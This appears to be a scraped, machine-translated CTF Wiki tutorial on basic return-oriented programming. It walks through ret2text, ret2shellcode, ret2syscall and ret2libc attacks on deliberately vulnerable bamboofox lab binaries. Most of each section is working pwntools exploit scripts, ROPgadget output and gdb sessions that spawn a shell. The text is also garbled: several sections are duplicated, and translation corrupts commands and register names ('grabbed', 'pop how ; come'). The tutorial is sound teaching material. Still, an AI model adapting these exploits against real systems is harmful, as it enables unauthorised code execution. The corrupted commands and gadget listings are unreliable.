\u00b6 Here we take ret2syscall in bamboofox as an example. \u70b9\u51fb\u4e0b\u8f7d: ret2syscall First check the protection of the program open \u279c ret2syscall checksec rop Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the source program is 32-bit and NX protection is turned on. Next use IDA to view the source code int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"This time, no system() and NO SHELLCODE!!!\" ); puts ( \"What do you plan to do?\" ); gets ( & v4 ); return 0 ; } It can be seen that this is still a stack overflow. Similar to the previous approach, we can get the offset of v4 relative to ebp to 108. So the return address we need to override is 112 relative to v4. This time, because we can't directly use a piece of code in the program or fill in the code to get the shell, we use the gadgets in the program to get the shell, and the corresponding shell acquisition uses the system call. For knowledge about system calls, please refer to https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 To put it simply, as long as we put the parameters of the system call corresponding to the get shell into the corresponding registers, we can execute the corresponding system call by executing int 0x80. For example, here we use the following system call to get the shell execve ( \"/bin/sh\" , NULL , NULL ) Among them, the program is 32 bit, so we need to make System call number, ie eax should be 0xb The first parameter, ebx, should point to the address of /bin/sh. In fact, the address of sh can be executed. The second parameter, ecx should be 0 the third parameter, edx should be 0 And how do we control the values of these registers? Here you need to use gadgets. For example, if the top of the stack is now 10, then if pop eax is executed at this time, the value of eax is now 10. But we can't expect a continuous code to control the corresponding registers at the same time, so we need a piece of control, which is why we use ret at the end of the gadgets to control the execution flow again. To find out how to use gadgets, we can use the ropgadgets tool. First, let's look for gadgets that control eax. \u279c ret2syscall ROPgadget --binary call --only & #39;pop | right&#39; | grabbed &#39;eax&#39; 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret You can see that all of the above can control eax, and I choose the second one as the gadgets. Similarly, we can get gadgets that control other registers. \u279c ret2syscall ROPgadget --binary call --only & #39;pop | right&#39; | grab &#39;ebx&#39; 0x0809dde2: pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4: pop ebx ; pop ebp ; pop how ; come ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b: pop ebx ; pop how ; come ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0805ae81: pop ebx ; pop how ; come ; pop ebp ; ret 4 0x08049bfd: pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913: pop ebx ; pop how ; come ; ret 0x08049a19: pop ebx ; pop how ; come ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9: pop ebx ; right 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b: come up ; pop how ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68: pop esi ; pop ebx ; pop edx ; right 0x0805c820, pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret Here, I choose 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret This can directly control the other three registers. In addition, we need to get the address corresponding to the /bin/sh string. \u279c ret2syscall ROPgadget --binary rop --string '/bin/sh' Strings information ============================================================ 0x080be408 : /bin/sh You can find the corresponding address, in addition, there is an address of int 0x80, as follows \u279c ret2syscall ROPgadget --binary rop --only 'int' Gadgets information ============================================================ 0x08049421 : int 0x80 0x080938fe : int 0xbb 0x080869b5 : int 0xf6 0x0807b4d4 : int 0xfc Unique gadgets found: 4 At the same time, I also found the corresponding address. The following is the corresponding payload, where 0xb is the system call number corresponding to execve. #!/usr/bin/env python from pwn import * sh = process ( & #39;./ call&#39;) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat ( [ 'A' * 112 , pop_eax_ret , 0xb , pop_edx_ecx_ebx_ret , 0 , 0 , binsh , int_0x80 ]) sh . sendline ( payload ) sh . interactive () Title \u00b6 ret2libc \u00b6 Principle \u00b6 Ret2libc is the function in the execution libc of the control function, usually returning to the plt of a function or the specific position of the function (that is, the content of the got entry corresponding to the function). In general, we will choose to execute system(\"/bin/sh\"), so we need to know the address of the system function. Examples \u00b6 We give three examples from simple to difficult. Example 1 \u00b6 Here we take ret2libc1 in bamboofox as an example. Click to download: ret2libc1 First, we can check the security of the program. \u279c ret2libc1 checksec ret2libc1 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) The source program is 32-bit and NX protection is turned on. Let's take a look at the program source code to determine the location of the vulnerability. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"RET2LIBC >_<\" ); gets (( char * ) & amp ; v4 ); return 0 ; } You can see that a stack overflow occurred while executing the gets function. Also, with ropgadget, we can see if /bin/sh exists \u279c ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information ============================================================ 0x08048720 : /bin/sh It does exist, look again to see if there is a system function. It is true that it is found in ida. ` asm .plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] So, we go back directly to it, executing the system function. The corresponding payload is as follows ```python #!/usr/bin/env python from pwn import * sh = process('./ret2libc1') binsh_addr = 0x8048720 system_plt = 0x08048460 payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr]) sh.sendline(payload) sh.interactive() Here we need to pay attention to the structure of the function call stack. If the system function is called normally, we will have a corresponding return address when calling, where 'bbbb' is used as the fake address, and then the parameter content corresponding to the parameter. This example is relatively simple, and provides the address of the system address and /bin/sh, but most programs don't have such a good condition. Example 2 \u00b6 Here is an example of ret2libc2 in bamboofox. \u70b9\u51fb\u4e0b\u8f7d: ret2libc2 This topic is basically the same as in Example 1, except that the /bin/sh string no longer appears, so we need to read the string ourselves, so we need two gadgets, the first control program reads the string, the first The two control programs execute system(\"/bin/sh\"). Since the vulnerability is consistent with the above, here is not to say more, the specific exp is as follows ##!/usr/bin/env python from pwn import * sh = process ( './ret2libc2' ) gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat ( [ 'a' * 112 , gets_plt , pop_ebx , buf2 , system_plt , 0xdeadbeef , buf2 ]) sh . sendline ( payload ) sh . sendline ( '/bin/sh' ) sh . interactive () Note that I am writing the /bin/sh string to buf2 in the bss section of the program and passing its address as a parameter to system. This is so easy to get the shell. Example 3 \u00b6 Here is an example of ret2libc3 in bamboofox. \u70b9\u51fb\u4e0b\u8f7d: ret2libc3 On the basis of Example 2, the address of the system function is removed again. At this point, we need to find both the address of the system function and the address of the /bin/sh string. First, check the security \u279c ret2libc3 checksec ret2libc3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) As you can see, the source program still has stack unexecutable protection turned on. Looking at the source code, I found that the bug in the program is still a stack overflow. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No surprise anymore, system disappeard QQ.\" ); printf ( \"Can you find it !?\" ); gets (( char * ) & amp ; v4 ); return 0 ; } So how do we get the address of the system function? Here mainly use two knowledge points The system function belongs to libc, and the relative offset between functions in the libc.so dynamic link library is fixed. Even if the program has ASLR protection, it is only random for the middle bits of the address, and the lowest 12 bits will not change. And libc is collected on github, as follows https://github.com/niklasb/libc-database So if we know the address of a function in libc, then we can determine the libc that the program uses. Then we can know the address of the system function. So how do I get the address of a function in libc? The commonly used method is to use the got table leak, that is, output the contents of the got item corresponding to a function. Of course, due to the lazy binding mechanism of libc, we need to leak the address of the function that has been executed. We can naturally get libc according to the above steps, then query the offset in the program, and then get the system address again, but this manual operation is too many times, a little trouble, here is a libc utilization tool, please refer to the readme for details. https://github.com/lieanu/LibcSearcher In addition, after getting libc, there is actually a /bin/sh string in libc, so we can get the address of the /bin/sh string together. Here we leak the address of __libc_start_main because it is where the program was originally executed. Basic use ideas are as follows Leak __libc_start_main address Get the libc version Get the address of the system address and /bin/sh Execute the source program again Trigger stack overflow execution system('/bin/sh') Exp is as follows #!/usr/bin/env python from pwn import * from LibcSearcher import LibcSearcher sh = process ( './ret2libc3' ) ret2libc3 = ELF ( './ret2libc3' ) puts_plt = ret2libc3 . plt [ & #39;puts&#39;] libc_start_main_got = ret2libc3 . got [ '__libc_start_main' ] main = ret2libc3 . symbols [ 'main' ] print \"leak libc_start_main_got addr and return to main again\" payload = flat ([ 'A' * 112 , puts_plt , main , libc_start_main_got ]) sh . sendlineafter ( 'Can you find it !?' , payload ) print \"get the related addr\" libc_start_main_addr = u32 ( sh . recv ()[ 0 : 4 ]) libc = LibcSearcher ( '__libc_start_main' , libc_start_main_addr ) libcbase = libc_start_main_addr - libc . dump ( '__libc_start_main' ) system_addr = libcbase + libc . dump ( 'system' ) binsh_addr = libcbase + libc . dump ( 'str_bin_sh' ) print \"get shell\" payload = flat ([ 'A' * 104 , system_addr , 0xdeadbeef , binsh_addr ]) sh . sendline ( payload ) sh . interactive () Title \u00b6 train.cs.nctu.edu.tw: ret2libc topic \u00b6 train.cs.nctu.edu.tw: rop 2013-PlaidCTF-ropasaurusrex Defcon 2015 Qualifier: R0pbaby Reference reading \u00b6 [Black Cloud Step by Step ROP (Steamed Rice)] ( http://wooyun.jozxing.cc/static/drops/tips-6597.html ) [Hands to teach you stack overflow from entry to give up (on)] ( https://zhuanlan.zhihu.com/p/25816426 ) [Hands to teach you stack overflow from entry to give up (below)] ( https://zhuanlan.zhihu.com/p/25892385 ) [ [Technology Sharing] Modern Stack Overflow Utilization Technology Foundation: ROP] ( http://bobao.360.cn/learning/detail/3694.html )","title":"Basic ROP"},{"location":"pwn/linux/stackoverflow/basic-rop/#rop","text":"With the NX protection turned on, it is difficult to continue to directly inject code directly into the stack or heap. Attackers have also proposed corresponding methods to bypass protection. At present, the main one is ROP (Return Oriented Programming). The main idea is to use the existing small fragments in the program based on the stack buffer overflow. ) to change the value of some registers or variables to control the execution flow of the program. The so-called gadgets are sequences of instructions ending in ret. Through these sequences of instructions, we can modify the contents of certain addresses to facilitate the control program execution process. It is called ROP because the core is to use the ret instruction in the instruction set to change the order in which the instruction stream is executed. ROP attacks generally have to satisfy the following conditions The program has an overflow and can control the return address. You can find the gadgets that meet the criteria and the address of the corresponding gadgets. If the address of the gadgets is not fixed every time, then we need to find a way to dynamically get the corresponding address.","title":"\u57fa\u672cROP"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2text","text":"","title":"ret2text"},{"location":"pwn/linux/stackoverflow/basic-rop/#principle","text":"Ret2text is the code (.text) that the control program executes the program itself. In fact, this method of attack is a general description. When we control the existing code of the execution program, we can also control the program to execute several pieces of code (that is, gadgets) of non-adjacent programs. This is what we want to say about ROP. At this point, we need to know the location of the corresponding returned code. Of course, the program may also open some protection, we need to find a way to bypass these protections.","title":"Principle"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples","text":"In fact, in the basic principle of stack overflow, we have introduced this simple attack. Here, let's give another example, the example of ret2text used in Bamboofox to introduce ROP. \u70b9\u51fb\u4e0b\u8f7d: ret2text First, check out the protection mechanism of the program. \u279c ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the program is a 32-bit program that only turns on stack unexecutable protection. Then we use IDA to view the source code. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"There is something amazing here, do you know anything?\" ); gets (( char * ) & amp ; v4 ); printf ( \"Maybe I will tell you next time !\" ); return 0 ; } It can be seen that the program uses the gets function in the main function, and obviously there is a stack overflow vulnerability. Later discovered ` asm .text:080485FD secure proc near .text:080485FD .text:080485FD input = dword ptr -10h .text:080485FD secretcode = dword ptr -0Ch .text:080485FD .text:080485FD push ebp .text:080485FE mov ebp, esp .text:08048600 sub esp, 28h .text:08048603 mov dword ptr [esp], 0 ; timer .text:0804860A call _time .text:0804860F mov [esp], eax ; seed .text:08048612 call _srand .text:08048617 call _rand .text:0804861C mov [ebp+secretcode], eax .text:0804861F lea eax, [ebp+input] .text:08048622 mov [esp+4], eax .text:08048626 mov dword ptr [esp], offset unk_8048760 .text:0804862D call ___isoc99_scanf .text:08048632 mov eax, [ebp+input] .text:08048635 cmp eax, [ebp+secretcode] .text:08048638 jnz short locret_8048646 .text:0804863A mov dword ptr [esp], offset command ; \"/bin/sh\" .text:08048641 call _system In the secure function, it is found that there is code calling system(&quot;/bin/sh&quot;), then if we directly control the program to return to 0x0804863A, then we can get the system shell. Here&#39;s how we construct the payload. The first thing we need to determine is the number of bytes from the start address of the memory we can control from the return address of the main function. `` `asm .text:080486A7 lea eax, [esp+1Ch] .text:080486AB mov [esp], eax ; s .text:080486AE call _gets You can see that the string is indexed relative to esp, so we need to debug, put the breakpoint at the call, view esp, ebp, as follows gef\u27a4 b *0x080486AE Breakpoint 1 at 0x80486ae: file ret2text.c, line 24 . gef\u27a4 r There is something amazing here, do you know anything? Breakpoint 1 , 0x080486ae in main () at ret2text.c:24 24 gets ( buf ) ; \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ registers ] \u2500\u2500\u2500\u2500 $eax : 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebx : 0x00000000 $ ecx: 0xffffffff $edx : 0xf7faf870 \u2192 0x00000000 $esp : 0xffffcd40 \u2192 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebp : 0xffffcdc8 \u2192 0x00000000 $ you are: 0xf7fae000 \u2192 0x001b1db0 $ edi: 0xf7fae000 \u2192 0x001b1db0 $ Eip: 0x080486ae \u2192 <main+102> call 0x8048460 <gets@plt> You can see that esp is 0xffffcd40, ebp is the specific payload as follows 0xffffcdc8, and the index of s relative to esp is [esp+0x1c], so the address of s is 0xffffcd5c, so the offset of s relative to ebp is 0x6C, so the relative The offset from the return address is 0x6c+4. The final payload is as follows: ##!/usr/bin/env python from pwn import * sh = process ( './ret2text' ) target = 0x804863a sh . sendline ( 'A' * ( 0x6c + 4 ) + p32 ( target )) sh . interactive ()","title":"Examples"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2shellcode","text":"","title":"ret2shellcode"},{"location":"pwn/linux/stackoverflow/basic-rop/#principle_1","text":"Ret2shellcode, which controls the program to execute shellcode code. Shellcode refers to the assembly code used to complete a function. The common function is to get the shell of the target system. In general, shellcode needs to be populated by ourselves. This is actually another typical use, that is, we need to fill in some executable code at this time. On the basis of the stack overflow, in order to execute the shellcode, the corresponding binary is required at runtime, and the area where the shellcode is located has executable permissions.","title":"Principle"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples_1","text":"Here we take ret2shellcode in bamboofox as an example. \u70b9\u51fb\u4e0b\u8f7d: ret2shellcode First check the protection of the program open \u279c ret2shellcode checksec ret2shellcode Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments It can be seen that the source program has almost no protection turned on, and is readable, writable, and executable. Let's look at the program again using IDA. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No system for you this time !!!\" ); gets (( char * ) & amp ; v4 ); strncpy ( buf2 , ( const char * ) & v4 , 0x64u ); printf ( \"bye bye ~\" ); return 0 ; } It can be seen that the program is still a basic stack overflow vulnerability, but this time also copy the corresponding string to buf2. A simple view shows that buf2 is in the bss section. ` asm .bss:0804A080 public buf2 .bss:0804A080 ; char buf2[100] At this point, we simply debug the program to see if this bss section is executable. ```shell gef\u27a4 b main Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8. gef\u27a4 r Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:8 8 setvbuf(stdout, 0LL, 2, 0LL); \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ source:ret2shellcode.c+8 ]\u2500\u2500\u2500\u2500 6 int main(void) 7 { \u2192 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x8048536 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so 0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so 0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so 0xfffdd000 0xffffe000 0x00000000 rwx [stack] Through vmmap, we can see that the segment corresponding to the bss segment has executable permissions. 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode So this time we control the program to execute the shellcode, which is to read the shellcode, and then control the program to execute the shellcode at the bss section. Among them, the corresponding offset calculation is similar to the example in ret2text. The specific payload is as follows #!/usr/bin/env python from pwn import * sh = process ( './ret2shellcode' ) shellcode = asm ( shellcraft . sh ()) buf2_addr = 0x804a080 sh . sendline ( shellcode . ljust ( 112 , 'A' ) + p32 ( buf2_addr )) sh . interactive ()","title":"Examples"},{"location":"pwn/linux/stackoverflow/basic-rop/#title","text":"sniperoj-pwn100-shellcode-x86-64","title":"Title"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2syscall","text":"","title":"ret2syscall"},{"location":"pwn/linux/stackoverflow/basic-rop/#principle_2","text":"Ret2syscall, that is, the control program executes the system call and gets the shell.","title":"Principle"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples_2","text":"Here we take ret2syscall in bamboofox as an example. \u70b9\u51fb\u4e0b\u8f7d: ret2syscall First check the protection of the program open \u279c ret2syscall checksec rop Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the source program is 32-bit and NX protection is turned on. Next use IDA to view the source code int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"This time, no system() and NO SHELLCODE!!!\" ); puts ( \"What do you plan to do?\" ); gets ( & v4 ); return 0 ; } It can be seen that this is still a stack overflow. Similar to the previous approach, we can get the offset of v4 relative to ebp to 108. So the return address we need to override is 112 relative to v4. This time, because we can't directly use a piece of code in the program or fill in the code to get the shell, we use the gadgets in the program to get the shell, and the corresponding shell acquisition uses the system call. For knowledge about system calls, please refer to https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 To put it simply, as long as we put the parameters of the system call corresponding to the get shell into the corresponding registers, we can execute the corresponding system call by executing int 0x80. For example, here we use the following system call to get the shell execve ( \"/bin/sh\" , NULL , NULL ) Among them, the program is 32 bit, so we need to make System call number, ie eax should be 0xb The first parameter, ebx, should point to the address of /bin/sh. In fact, the address of sh can be executed. The second parameter, ecx should be 0 the third parameter, edx should be 0 And how do we control the values of these registers? Here you need to use gadgets. For example, if the top of the stack is now 10, then if pop eax is executed at this time, the value of eax is now 10. But we can't expect a continuous code to control the corresponding registers at the same time, so we need a piece of control, which is why we use ret at the end of the gadgets to control the execution flow again. To find out how to use gadgets, we can use the ropgadgets tool. First, let's look for gadgets that control eax. \u279c ret2syscall ROPgadget --binary call --only & #39;pop | right&#39; | grabbed &#39;eax&#39; 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret You can see that all of the above can control eax, and I choose the second one as the gadgets. Similarly, we can get gadgets that control other registers. \u279c ret2syscall ROPgadget --binary call --only & #39;pop | right&#39; | grab &#39;ebx&#39; 0x0809dde2: pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4: pop ebx ; pop ebp ; pop how ; come ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b: pop ebx ; pop how ; come ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0805ae81: pop ebx ; pop how ; come ; pop ebp ; ret 4 0x08049bfd: pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913: pop ebx ; pop how ; come ; ret 0x08049a19: pop ebx ; pop how ; come ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9: pop ebx ; right 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b: come up ; pop how ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68: pop esi ; pop ebx ; pop edx ; right 0x0805c820, pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret Here, I choose 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret This can directly control the other three registers. In addition, we need to get the address corresponding to the /bin/sh string. \u279c ret2syscall ROPgadget --binary rop --string '/bin/sh' Strings information ============================================================ 0x080be408 : /bin/sh You can find the corresponding address, in addition, there is an address of int 0x80, as follows \u279c ret2syscall ROPgadget --binary rop --only 'int' Gadgets information ============================================================ 0x08049421 : int 0x80 0x080938fe : int 0xbb 0x080869b5 : int 0xf6 0x0807b4d4 : int 0xfc Unique gadgets found: 4 At the same time, I also found the corresponding address. The following is the corresponding payload, where 0xb is the system call number corresponding to execve. #!/usr/bin/env python from pwn import * sh = process ( & #39;./ call&#39;) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat ( [ 'A' * 112 , pop_eax_ret , 0xb , pop_edx_ecx_ebx_ret , 0 , 0 , binsh , int_0x80 ]) sh . sendline ( payload ) sh . interactive ()","title":"Examples"},{"location":"pwn/linux/stackoverflow/basic-rop/#title_1","text":"","title":"Title"},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2libc","text":"","title":"ret2libc"},{"location":"pwn/linux/stackoverflow/basic-rop/#principle_3","text":"Ret2libc is the function in the execution libc of the control function, usually returning to the plt of a function or the specific position of the function (that is, the content of the got entry corresponding to the function). In general, we will choose to execute system(\"/bin/sh\"), so we need to know the address of the system function.","title":"Principle"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples_3","text":"We give three examples from simple to difficult.","title":"Examples"},{"location":"pwn/linux/stackoverflow/basic-rop/#example-1","text":"Here we take ret2libc1 in bamboofox as an example. Click to download: ret2libc1 First, we can check the security of the program. \u279c ret2libc1 checksec ret2libc1 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) The source program is 32-bit and NX protection is turned on. Let's take a look at the program source code to determine the location of the vulnerability. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"RET2LIBC >_<\" ); gets (( char * ) & amp ; v4 ); return 0 ; } You can see that a stack overflow occurred while executing the gets function. Also, with ropgadget, we can see if /bin/sh exists \u279c ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information ============================================================ 0x08048720 : /bin/sh It does exist, look again to see if there is a system function. It is true that it is found in ida. ` asm .plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] So, we go back directly to it, executing the system function. The corresponding payload is as follows ```python #!/usr/bin/env python from pwn import * sh = process('./ret2libc1') binsh_addr = 0x8048720 system_plt = 0x08048460 payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr]) sh.sendline(payload) sh.interactive() Here we need to pay attention to the structure of the function call stack. If the system function is called normally, we will have a corresponding return address when calling, where 'bbbb' is used as the fake address, and then the parameter content corresponding to the parameter. This example is relatively simple, and provides the address of the system address and /bin/sh, but most programs don't have such a good condition.","title":"Example 